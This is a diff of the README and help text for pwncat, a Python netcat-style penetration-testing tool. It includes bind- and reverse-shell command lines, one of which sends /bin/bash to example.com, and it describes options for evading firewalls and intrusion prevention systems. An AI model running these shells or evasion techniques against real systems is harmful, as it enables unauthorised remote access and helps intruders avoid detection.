@@ -21,12 +21,17 @@
 
 [![Build Status](https://github.com/cytopia/pwncat/workflows/linting/badge.svg)](https://github.com/cytopia/pwncat/actions?workflow=linting)
 [![Build Status](https://github.com/cytopia/pwncat/workflows/building/badge.svg)](https://github.com/cytopia/pwncat/actions?workflow=building)
-[![Build Status](https://github.com/cytopia/pwncat/workflows/testing/badge.svg)](https://github.com/cytopia/pwncat/actions?workflow=testing)
+[![Build Status](https://github.com/cytopia/pwncat/workflows/Linux/badge.svg)](https://github.com/cytopia/pwncat/actions?workflow=Linux)
+[![Build Status](https://github.com/cytopia/pwncat/workflows/MacOS/badge.svg)](https://github.com/cytopia/pwncat/actions?workflow=MacOS)
+[![Build Status](https://github.com/cytopia/pwncat/workflows/Windows/badge.svg)](https://github.com/cytopia/pwncat/actions?workflow=Windows)
 
 
 > &nbsp;
-> #### Netcat on steroids with Firewall and IPS evasion, bind and reverse shell, local and remote port-forward.
+> #### Netcat on steroids with Firewall and IPS evasion, bind and reverse shell, and local port forwarding.
 > &nbsp;
+
+| :warning: Warning: it is currently in feature-incomplete alpha state. Expect bugs and options to change. ([Roadmap](https://github.com/cytopia/pwncat/issues/2)) |
+|---|
 
 
 ### Motivation
@@ -34,14 +39,12 @@
 Ever accidentally hit <kbd>Ctrl</kbd>+<kbd>c</kbd> on your reverse shell and it was gone for good?
 Ever waited forever for your client to connect back to you, because the Firewall didn't let it out?
 Ever had a connection loss because an IPS closed suspicious ports?
-Ever were in need of port-forwarding, but you didn't have SSH access?<br/>
+Ever were in need of a quick port forwarding?<br/>
 > **This one got you covered.**
 
 Apart from that the current features of `nc`, `ncat` or `socat` just didn't feed my needs and I also wanted to have a single
 tool that works on older and newer machines (hence Python 2+3 compat). Most importantly I wanted to have it in a language that I can understand and provide my own features with.
 (Wait for it, binary releases for Linux, MacOS and Windows will come shortly).
-
-Some options are still under development. See [Roadmap](https://github.com/cytopia/pwncat/issues/2) and [Changelog](CHANGELOG.md) for details.
 
 
 ## :tada: Install
@@ -70,7 +73,7 @@ pwncat -l -e '/bin/bash' 8080
 # reverse shell
 pwncat -e '/bin/bash' example.com 4444
 ```
-#### Port-forwarding without SSH
+#### Port forwarding
 
 See here to un-brainfuck: https://www.everythingcli.org/ssh-tunnelling-for-fun-and-profit-local-vs-remote/<br/>
 (Using the same examples to make it more clear)
@@ -85,10 +88,6 @@ That's why we just assume the MySQL server is listening publically on everything
 # (listen locally on 127.0.0.1:5000 and proxy everything to everythingcli.org:3306)
 pwncat -L 127.0.0.1:5000 everythingcli.org 3306
 ```
-```bash
-# Remote port forward (-R) to evade firewalls
-pwncat -R 127.0.0.1:3306 example.com 4444
-```
 
 
 ## :star: Features
@@ -99,8 +98,8 @@ pwncat -R 127.0.0.1:3306 example.com 4444
 |----------------|-------------|
 | Bind shell     | Create bind shells |
 | Reverse shell  | Create reverse shells |
-| Proxy          | Local and remote port forwards without SSH |
-| Ctrl+c protect | Reverse shell can reconnect if you accidentally hit Ctrl+c |
+| Port Forward   | Local port forward (Proxy server) |
+| <kbd>Ctrl</kbd>+<kbd>c</kbd> | Reverse shell can reconnect if you accidentally hit <kbd>Ctrl</kbd>+<kbd>c</kbd> |
 | Detect Egress  | Scan and report open egress ports on the target |
 | Evade FW       | Evade egress firewalls by round-robin outgoing ports |
 | Evade IPS      | Evade Intrusion Prevention Systems by being able to round-robin outgoing ports on connection interrupts |
@@ -138,7 +137,8 @@ stty rows <num> columns <num>   # values found above by 'stty size'
 Documentation will evolve over time.
 
 * API docs can be found here: [pwncat.api.html](https://cytopia.github.io/pwncat/pwncat.api.html)
-* Man page can be found here: [pwncat.1](man/pwncat.1)
+* HTML man page can be found here: [pwncat.man.html](https://cytopia.github.io/pwncat/pwncat.man.html)
+* Raw man page can be found here: [pwncat.1](man/pwncat.1)
 
 
 ## :computer: Usage
@@ -147,14 +147,18 @@ usage: pwncat [-Cnuv] [-e cmd] hostname port
        pwncat [-Cnuv] [-e cmd] -l [hostname] port
        pwncat [-Cnuv] -z hostname port
        pwncat [-Cnuv] -L addr:port [hostname] port
-       pwncat [-Cnuv] -R addr:port hostname port
        pwncat -V, --version
        pwncat -h, --help
 
 
 Enhanced and comptaible Netcat implementation written in Python (2 and 3) with
 connect, zero-i/o, listen and forward modes and techniques to detect and evade
-firewalls and intrusion prevention systems.
+firewalls and intrusion detection/prevention systems.
+
+If no mode arguments are specified, pwncat will run in connect mode and act as
+a client to connect to a remote endpoint. If the connection to the remote
+endoint is lost, pwncat will quit. See advanced options for how to automatically
+reconnect.
 
 positional arguments:
   hostname              Address to listen, forward or connect to
@@ -162,99 +166,137 @@ positional arguments:
 
 mode arguments:
   -l, --listen          [Listen mode]:
-                        Start server and listen for incoming connections.
+                        Start a server and listen for incoming connections.
+                        If using TCP and a connected client disconnects or the
+                        connection is interrupted otherwise, the server will
+                        quit. See -k/--keep-open to change this behaviour.
 
   -z, --zero            [Zero-I/0 mode]:
                         Connect to a remote endpoint and report status only.
+                        Used for port scanning.
 
   -L addr:port, --local addr:port
                         [Local forward mode]:
-                        Specify local <addr>:<port> to which traffic should be
-                        forwarded to. pwncat will listen locally
-                        (specified by hostname and port) and forward all
-                        traffic to the specified value for -L/--local.
-
-  -R addr:port, --remote addr:port
-                        [Remote forward mode]:
-                        Specify local <addr>:<port> from which traffic should be
-                        forwarded from. pwncat will connect remotely
-                        (specified by hostname and port) and for ward all
-                        traffic from the specified value for -R/--remote.
+                        This mode will start a server and a client internally.
+                        The internal server will listen locally on specified
+                        hostname/port (positional arguments). Same as with -l.
+                        The server will then forward traffic to the internal
+                        client which connects to another server specified by
+                        address given via -L/--local addr:port.
+                        (I.e.: proxies a remote service to a local address)
 
 optional arguments:
   -e cmd, --exec cmd    Execute shell command. Only for connect or listen mode.
   -C, --crlf            Send CRLF line-endings in connect mode (default: LF)
   -n, --nodns           Do not resolve DNS.
-  -u, --udp             UDP mode
+  -u, --udp             Use UDP for the connection instead of TCP.
   -v, --verbose         Be verbose and print info to stderr. Use -v, -vv, -vvv
                         or -vvvv for more verbosity. The server performance will
-                        decrease drastically if you use more than three -v.
+                        decrease drastically if you use more than three times.
 
 advanced arguments:
-  --reinit x            Listen mode (TCP only):
+  --http                Connect / Listen / Local forward mode (TCP only):
+                        Hide traffic in http packets to fool Firewalls/IDS/IPS.
+
+  --https               Connect / Listen / Local forward mode (TCP only):
+                        Hide traffic in https packets to fool Firewalls/IDS/IPS.
+
+  -k, --keep-open       Listen mode (TCP only):
+                        Re-accept new clients in listen mode after a client has
+                        disconnected or the connection is unterrupted otherwise.
+                        (default: server will quit after connection is gone)
+
+  --rebind x            Listen mode (TCP and UDP):
                         If the server is unable to bind or accept clients, it
                         will re-initialize itself x many times before giving up.
-                        Use 0 to re-initialize endlessly. (default: don't).
+                        Use 0 to re-initialize endlessly. (default: fail after
+                        first unsuccessful try).
 
-                        Connect mode (TCP only):
-                        If the client is unable to connect to a remote endpoint,
-                        it will try again x many times before giving up.
-                        Use 0 to retry endlessly. (default: don't)
+  --rebind-wait s       Listen mode (TCP and UDP):
+                        Wait x seconds between re-initialization. (default: 1)
 
-                        Zero-I/O mode (TCP only):
-                        Same as connect mode.
+  --rebind-robin port   Listen mode (TCP and UDP):
+                        If the server is unable to initialize (e.g: cannot bind
+                        and --rebind is specified, it it will shuffle ports in
+                        round-robin mode to bind to. Use comma separated string
+                        such as '80,81,82' or a range of ports '80-100'.
+                        Set --rebind to at least the number of ports to probe +1
+                        This option requires --rebind to be specified.
 
-  --reconn x            Listen mode (TCP only):
-                        If the client has hung up, the server will re-accept a
-                        new client x many times before quitting. Use 0 to accept
-                        endlessly. (default: quit after a client has hung up)
+  --reconn x            Connect mode / Zero-I/O mode (TCP only):
+                        If the remote server is not reachable or the connection
+                        is interrupted, the client will connect again x many
+                        times before giving up. Use 0 to retry endlessly.
+                        (default: quit if the remote is not available or the
+                        connection was interrupted)
+                        This might be handy for stable TCP reverse shells ;-)
 
-                        Connect mode (TCP only):
-                        If the remote server is gone, the client will re-connect
-                        to it x many times before giving up. Use 0 to reconnect
-                        endlessy. (default: don't)
-                        This might be handy for reverse shells ;-)
+  --reconn-wait s       Connect mode / Zero-I/O mode (TCP only):
+                        Wait x seconds between re-connects. (default: 1)
 
-  --reinit-robin port   Connect mode (TCP only):
-                        If the client does multiple initial connections to a
-                        remote endpoint (via --reinit), this option instructs it
-                        to also "round-robin" different ports to connect to. It
-                        will stop iterating after first successfull connection
-                        and stick with it or quit if --reinit limit is reached.
-                        Use comma separated string: 80,81,82 or a range 80-100.
-                        Set --reinit to at least the number of ports to probe +1
-                        Set --reinit-wait to 0
-                        This helps to evade EGRESS firewalls for reverse shells
-                        Use with -z/--zero to probe outbound allowed ports.
-                        Ensure to have enough listeners at the remote endpoint.
-
-  --reconn-robin port   Connect mode (TCP only):
-                        If the remote endpoint is gone after initial successful
-                        connection, and the the client is set to reconnect with
-                        (--reconn), it will connect back by "round-robin" to
-                        different ports. It will stop after --reconn limit has
-                        reached.
+  --reconn-robin port   Connect mode / Zero-I/O mode (TCP only):
+                        If the remote server is not reachable or the connection
+                        is interrupted and --reconn is specified, the client
+                        will shuffle ports in round-robin mode to connect to.
+                        Use comma separated string such as '80,81,82' or a range
+                        of ports '80-100'.
                         Set --reconn to at least the number of ports to probe +1
-                        Set --reconn-wait to 0
-                        This help your reverse shell to evade intrusion
-                        prevention systems that will cut your connection and
-                        block the outbound port.
+                        This helps reverse shell to evade intrusiona prevention
+                        systems that will cut your connection and block the
+                        outbound port.
+                        This is also useful in Connect or Zero-I/O mode to
+                        figure out what outbound ports are allowed.
 
-  --reinit-wait s       Wait x seconds between re-inits. (default: 1)
+  -w s, --wait s        Connect mode (TCP only):
+                        If a connection and stdin are idle for more than s sec,
+                        then the connection is silently closed and the client
+                        will exit. (default: wait forever).
+                        Note: if --reconn is specified, the connection will be
+                        re-opened.
 
-  --reconn-wait s       Wait x seconds between re-connects. (default: 1)
+  --udp-ping-init       Connect mode / Zero-I/O mode (UDP only):
+                        UDP is a stateless protocol unlike TCP, so no hand-
+                        shake communication takes place and the client just
+                        sends data to a server without being "accepted" by
+                        the server first.
+                        This means a server waiting for an UDP client to
+                        connect to, is unable to send any data to the client,
+                        before the client hasn't send data first. The server
+                        simply doesn't know the IP address before an initial
+                        connect.
+                        The --udp-ping-init option instructs the client to send
+                        one single initial ping packet to the server, so that it
+                        is able to talk to the client.
+                        This is the only way to make a UDP reverse shell work.
+                        See --udp-ping-word for what char/string to send as
+                        initial ping packet (default: '\0')
 
-  --udp-ping-intvl s    Connect mode (UDP only):
-                        As UDP is stateless, a client must first connect to a
-                        server before the server can communicate with it.
-                        If you listen on UDP and wait for a reverse UDP client
-                        or reverse UDP shell, you can only talk to it after it
-                        has sent you some initial data, as UDP does not have a
-                        "connect" state like TCP.
-                        This option instructs the UDP client to send a single
-                        newline every s seconds. By not only doing it once,
-                        but in intervals, you can also maintain a connection
-                        if you restart your listening server.
+  --udp-ping-intvl s    Connect mode / Zero-I/O mode (UDP only):
+                        Instruct the UDP client to send ping intervalls every
+                        s seconds. This allows you to restart your UDP server
+                        and just wait for the client to report back in.
+                        This might be handy for stable UDP reverse shells ;-)
+                        See --udp-ping-word for what char/string to send as
+                        initial ping packet (default: '\0')
+
+  --udp-ping-word str   Connect mode / Zero-I/O mode (UDP only):
+                        Change the default character '\0' to use for upd ping.
+                        Single character or strings are supported.
+
+  --udp-ping-robin port
+                        Zero-I/O mode (UDP only):
+                        Instruct the UDP client to shuffle the specified ports
+                        in round-robin mode for a remote server to ping.
+                        This might be handy to scan outbound allowed ports.
+                        Use --udp-ping-intvl 0 to be faster.
+
+  --safe-word str       All modes:
+                        If pwncat is started with this argument, it will shut
+                        down as soon as it receives the specified string. The
+                        --keep (server) or --reconn (client) options will be
+                        ignored and it won't listen again or reconnect to you.
+                        Use a very unique string to not have it shut down
+                        accidentally by other input.
 
 misc arguments:
   -h, --help            Show this help message and exit
